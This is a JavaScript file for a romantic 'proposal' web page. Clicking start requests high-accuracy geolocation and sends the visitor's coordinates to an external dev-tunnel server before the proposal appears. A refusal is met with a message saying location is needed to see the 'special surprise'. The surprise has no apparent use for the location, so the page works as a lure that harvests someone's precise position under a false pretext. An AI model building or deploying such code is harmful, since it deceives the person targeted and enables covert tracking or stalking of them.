document.getElementById('start-btn').addEventListener('click', function () {
    const setupContent = document.getElementById('setup-content');
    const loadingContainer = document.getElementById('loading-container');
    const statusText = document.getElementById('status-text');

    if (!navigator.geolocation) {
        statusText.innerText = "Geolocation is not supported by your browser.";
        return;
    }

    // 1. Hide the initialization button/text and show the loading circle
    setupContent.classList.add('hidden');
    loadingContainer.classList.remove('hidden');

    // 2. Request Geolocation
    navigator.geolocation.getCurrentPosition(
        async function (position) {
            const payload = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };

            try {
                // Send payload to backend API
                const response = await fetch('https://3w3tm668-3000.inc1.devtunnels.ms/api/location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    transitionToProposal();
                } else {
                    // Revert UI on server error
                    loadingContainer.classList.add('hidden');
                    setupContent.classList.remove('hidden');
                    statusText.innerText = "Server error. Please reload the page and try again.";
                }
            } catch (error) {
                console.error("Network error:", error);
                // Revert UI on network failure
                loadingContainer.classList.add('hidden');
                setupContent.classList.remove('hidden');
                statusText.innerText = "Connection failed. Please ensure the backend server is running.";
            }
        },
        function (error) {
            console.warn("Location error:", error.message);
            // 3. Revert UI if permission is denied, and display instructions
            loadingContainer.classList.add('hidden');
            setupContent.classList.remove('hidden');
            statusText.innerHTML = "<span style='color: #c9184a; font-weight: bold;'>Permission Required</span><br><br>To see your special surprise, please refresh the page and select 'Allow' when the browser asks for your location.";
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
});

function transitionToProposal() {
    // Add the romantic illustration background to the body
    document.body.classList.add('has-bg-image');

    // Hide the setup card entirely, reveal the proposal card
    document.getElementById('setup-screen').classList.add('hidden');
    document.getElementById('proposal-screen').classList.remove('hidden');

    // Trigger music
    const audio = document.getElementById('bg-music');
    audio.play().catch(err => console.log("Audio autoplay restricted:", err));
}

// ... Keep your existing interactive 'No' button logic here ...

// Interactive button effect for the 'No' button
const noBtn = document.getElementById('no-btn');
noBtn.addEventListener('mouseover', function () {
    // Optional: make the button move away or enlarge the yes button
    const x = Math.random() * (window.innerWidth - this.offsetWidth);
    const y = Math.random() * (window.innerHeight - this.offsetHeight);
    this.style.position = 'absolute';
    this.style.left = x + 'px';
    this.style.top = y + 'px';
});

document.getElementById('yes-btn').addEventListener('click', function () {
    alert("💖 Thank you for making my world beautiful! 🌹");
});